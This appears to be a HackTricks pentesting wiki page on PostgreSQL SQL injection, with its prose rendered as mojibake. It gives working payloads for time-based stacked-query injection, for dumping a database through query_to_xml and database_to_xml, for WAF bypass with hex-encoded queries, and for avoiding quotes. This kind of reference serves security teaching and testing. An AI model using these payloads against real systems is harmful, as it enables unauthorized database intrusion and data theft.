# PostgreSQL injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_–≤–∏–º–∞–≥–∞—î—Ç—å—Å—è –≤—ñ–ª—å–Ω–µ –≤–æ–ª–æ–¥—ñ–Ω–Ω—è –ø–æ–ª—å—Å—å–∫–æ—é –º–æ–≤–æ—é –≤ —É—Å–Ω—ñ–π —Ç–∞ –ø–∏—Å—å–º–æ–≤—ñ–π —Ñ–æ—Ä–º—ñ_).

{% embed url="https://www.stmcyber.com/careers" %}

***

**–¶—è —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –º–∞—î –Ω–∞ –º–µ—Ç—ñ –ø–æ—è—Å–Ω–∏—Ç–∏ —Ä—ñ–∑–Ω—ñ —Ç—Ä—é–∫–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –¥–æ–ø–æ–º–æ–≥—Ç–∏ –≤–∞–º –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ SQL-—ñ–Ω'—î–∫—Ü—ñ—é, –≤–∏—è–≤–ª–µ–Ω—É –≤ –±–∞–∑—ñ –¥–∞–Ω–∏—Ö postgresql, —ñ –¥–æ–ø–æ–≤–Ω–∏—Ç–∏ —Ç—Ä—é–∫–∏, —è–∫—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –Ω–∞** [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

## Network Interaction - Privilege Escalation, Port Scanner, NTLM challenge response disclosure & Exfiltration

**–ú–æ–¥—É–ª—å PostgreSQL `dblink`** –ø—Ä–æ–ø–æ–Ω—É—î –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ —ñ–Ω—à–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ PostgreSQL —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è TCP-–∑'—î–¥–Ω–∞–Ω—å. –¶—ñ —Ñ—É–Ω–∫—Ü—ñ—ó, –≤ –ø–æ—î–¥–Ω–∞–Ω–Ω—ñ –∑ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—é `COPY FROM`, –¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥—ñ—ó, —Ç–∞–∫—ñ —è–∫ –µ—Å–∫–∞–ª–∞—Ü—ñ—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤ —Ç–∞ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –Ω–∞ –≤–∏–∫–ª–∏–∫ NTLM. –î–ª—è –¥–µ—Ç–∞–ª—å–Ω–∏—Ö –º–µ—Ç–æ–¥—ñ–≤ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü–∏—Ö –∞—Ç–∞–∫ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫ [–≤–∏–∫–æ–Ω–∞—Ç–∏ —Ü—ñ –∞—Ç–∞–∫–∏](network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.md).

### **–ü—Ä–∏–∫–ª–∞–¥ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º dblink —Ç–∞ –≤–µ–ª–∏–∫–∏—Ö –æ–±'—î–∫—Ç—ñ–≤**

–í–∏ –º–æ–∂–µ—Ç–µ [**–ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Ü–µ–π –ø—Ä–∏–∫–ª–∞–¥**](dblink-lo\_import-data-exfiltration.md), —â–æ–± –ø–æ–±–∞—á–∏—Ç–∏ –ø—Ä–∏–∫–ª–∞–¥ CTF **—è–∫ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –¥–∞–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—É –≤–µ–ª–∏–∫–∏—Ö –æ–±'—î–∫—Ç—ñ–≤, –∞ –ø–æ—Ç—ñ–º –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –≤–º—ñ—Å—Ç –≤–µ–ª–∏–∫–∏—Ö –æ–±'—î–∫—Ç—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** —Ñ—É–Ω–∫—Ü—ñ—ó `dblink_connect`.

## PostgreSQL Attacks: Read/write, RCE, privesc

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —Ö–æ—Å—Ç —ñ –µ—Å–∫–∞–ª—É–≤–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –∑ PostgreSQL —É:

{% content-ref url="../../../network-services-pentesting/pentesting-postgresql.md" %}
[pentesting-postgresql.md](../../../network-services-pentesting/pentesting-postgresql.md)
{% endcontent-ref %}

## WAF bypass

### PostgreSQL String functions

–ú–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è —Ä—è–¥–∫–∞–º–∏ –º–æ–∂–µ –¥–æ–ø–æ–º–æ–≥—Ç–∏ –≤–∞–º **–æ–±—ñ–π—Ç–∏ WAF –∞–±–æ —ñ–Ω—à—ñ –æ–±–º–µ–∂–µ–Ω–Ω—è**.\
[**–ù–∞ —Ü—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ** ](https://www.postgresqltutorial.com/postgresql-string-functions/)**–≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∫—ñ–ª—å–∫–∞ –∫–æ—Ä–∏—Å–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π —Ä—è–¥–∫—ñ–≤.**

### Stacked Queries

–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ postgresql –ø—ñ–¥—Ç—Ä–∏–º—É—î –≤–∫–ª–∞–¥–µ–Ω—ñ –∑–∞–ø–∏—Ç–∏, –∞–ª–µ –∫—ñ–ª—å–∫–∞ –¥–æ–¥–∞—Ç–∫—ñ–≤ –≤–∏–¥–∞–¥—É—Ç—å –ø–æ–º–∏–ª–∫—É, —è–∫—â–æ –±—É–¥–µ –ø–æ–≤–µ—Ä–Ω–µ–Ω–æ 2 –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, –∫–æ–ª–∏ –æ—á—ñ–∫—É—î—Ç—å—Å—è –ª–∏—à–µ 1. –ê–ª–µ –≤–∏ –≤—Å–µ —â–µ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –≤–∫–ª–∞–¥–µ–Ω–∏–º–∏ –∑–∞–ø–∏—Ç–∞–º–∏ —á–µ—Ä–µ–∑ Time injection:
```
id=1; select pg_sleep(10);-- -
1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
```
### XML —Ç—Ä—é–∫–∏

**query\_to\_xml**

–¶—è —Ñ—É–Ω–∫—Ü—ñ—è –ø–æ–≤–µ—Ä–Ω–µ –≤—Å—ñ –¥–∞–Ω—ñ —É —Ñ–æ—Ä–º–∞—Ç—ñ XML –≤ –æ–¥–Ω–æ–º—É —Ñ–∞–π–ª—ñ. –¶–µ —ñ–¥–µ–∞–ª—å–Ω–æ, —è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –±–∞–≥–∞—Ç–æ –¥–∞–Ω–∏—Ö –≤ –æ–¥–∏–Ω —Ä—è–¥–æ–∫:
```sql
SELECT query_to_xml('select * from pg_user',true,true,'');
```
**database\_to\_xml**

–¶—è —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç—å –≤—Å—é –±–∞–∑—É –¥–∞–Ω–∏—Ö —É —Ñ–æ—Ä–º–∞—Ç—ñ XML –≤ –ª–∏—à–µ 1 —Ä—è–¥–æ–∫ (–æ–±–µ—Ä–µ–∂–Ω–æ, —è–∫—â–æ –±–∞–∑–∞ –¥–∞–Ω–∏—Ö –¥—É–∂–µ –≤–µ–ª–∏–∫–∞, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ DoS –∞–±–æ –Ω–∞–≤—ñ—Ç—å –≤–∞—à–æ–≥–æ –≤–ª–∞—Å–Ω–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞):
```sql
SELECT database_to_xml(true,true,'');
```
### Strings in Hex

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ **–∑–∞–ø–∏—Ç–∏**, –ø–µ—Ä–µ–¥–∞—é—á–∏ —ó—Ö **–≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ä—è–¥–∫–∞** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ñ—É–Ω–∫—Ü—ñ—é **`query_to_xml`**). **–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ convert\_from, —â–æ–± –ø–µ—Ä–µ–¥–∞—Ç–∏ —Ä—è–¥–æ–∫ —É –≤–∏–≥–ª—è–¥—ñ —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ–≥–æ –∫–æ–¥—É —ñ —Ç–∞–∫–∏–º —á–∏–Ω–æ–º –æ–±—ñ–π—Ç–∏ —Ñ—ñ–ª—å—Ç—Ä–∏:** 

{% code overflow="wrap" %}
```sql
select encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8');

# Bypass via stacked queries + error based + query_to_xml with hex
;select query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h

# Bypass via boolean + error based + query_to_xml with hex
1 or '1' = (query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -
```
{% endcode %}

### –ó–∞–±–æ—Ä–æ–Ω–µ–Ω—ñ –ª–∞–ø–∫–∏

–Ø–∫—â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ª–∞–ø–∫–∏ –¥–ª—è –≤–∞—à–æ–≥–æ payload, –≤–∏ –º–æ–∂–µ—Ç–µ –æ–±—ñ–π—Ç–∏ —Ü–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `CHR` –¥–ª—è –±–∞–∑–æ–≤–∏—Ö –∫–ª–∞—É–∑ (_–∫–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—è —Å–∏–º–≤–æ–ª—ñ–≤ –ø—Ä–∞—Ü—é—î –ª–∏—à–µ –¥–ª—è –±–∞–∑–æ–≤–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ SELECT, INSERT, DELETE —Ç–æ—â–æ. –¶–µ –Ω–µ –ø—Ä–∞—Ü—é—î –¥–ª—è –≤—Å—ñ—Ö SQL –æ–ø–µ—Ä–∞—Ç–æ—Ä—ñ–≤_):
```
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
```
–ê–±–æ –∑ `$`. –¶—ñ –∑–∞–ø–∏—Ç–∏ –ø–æ–≤–µ—Ä—Ç–∞—é—Ç—å –æ–¥–Ω–∞–∫–æ–≤—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏:
```
SELECT 'hacktricks';
SELECT $$hacktricks$$;
SELECT $TAG$hacktricks$TAG$;
```
<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

–Ø–∫—â–æ –≤–∏ –∑–∞—Ü—ñ–∫–∞–≤–ª–µ–Ω—ñ –≤ **–∫–∞—Ä'—î—Ä—ñ –≤ —Ö–∞–∫–µ—Ä—Å—Ç–≤—ñ** —Ç–∞ —Ö–æ—á–µ—Ç–µ –∑–ª–∞–º–∞—Ç–∏ –Ω–µ–∑–ª–∞–º–Ω–µ - **–º–∏ –Ω–∞–π–º–∞—î–º–æ!** (_–≤–∏–º–∞–≥–∞—î—Ç—å—Å—è –≤—ñ–ª—å–Ω–µ –≤–æ–ª–æ–¥—ñ–Ω–Ω—è –ø–æ–ª—å—Å—å–∫–æ—é –º–æ–≤–æ—é –≤ –ø–∏—Å—å–º–æ–≤—ñ–π —Ç–∞ —É—Å–Ω—ñ–π —Ñ–æ—Ä–º—ñ_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
